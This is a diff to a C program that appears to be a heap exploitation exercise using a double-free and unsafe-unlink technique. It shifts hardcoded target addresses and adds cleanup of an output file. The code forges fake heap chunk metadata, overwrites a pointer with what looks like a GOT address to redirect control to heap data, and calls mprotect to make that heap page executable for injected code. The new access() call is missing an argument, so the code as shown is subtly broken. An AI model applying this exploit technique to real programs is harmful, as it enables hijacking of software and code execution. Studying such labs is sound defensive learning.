@@ -13,7 +13,7 @@ unsigned char *p2;
 
 void attack(){
 
-	unsigned long **LOCATION = (unsigned long **)0x0000000000601080;
+	unsigned long **LOCATION = (unsigned long **)0x0000000000601090;
 	*LOCATION = (unsigned long *)0x00000000000601018;
 	**LOCATION = (unsigned long) (p2+32);
 	mprotect((void *)((uint64_t)p2 & ~4095),4096,PROT_WRITE|PROT_READ|PROT_EXEC);
@@ -21,6 +21,9 @@ void attack(){
 }
 
 int main(){
+	if (access("./output/double_free_injection_output.c")){
+		remove("./output/double_free_injection_output.c");
+	}
 
 	char file_name[] = "./input/input.txt";
 	char buf[SIZE];
@@ -49,8 +52,8 @@ int main(){
 /*
 	*(unsigned long *)p0 = 0;		//0x0000000000000000
 	*(unsigned long *)(p0+8) = 448+1;	//0x00000000000001c1
-	*(unsigned long *)(p0+16) = (unsigned long)0x0000000000601080-24;
-	*(unsigned long *)(p0+24) = (unsigned long)0x0000000000601080-16;
+	*(unsigned long *)(p0+16) = (unsigned long)0x0000000000601090-24;
+	*(unsigned long *)(p0+24) = (unsigned long)0x0000000000601090-16;
 	*(unsigned long *)(p1-16) = 448;	//0x00000000000001c0;
 	*(unsigned long *)(p1-8) = 320;		//0x0000000000000140
 */
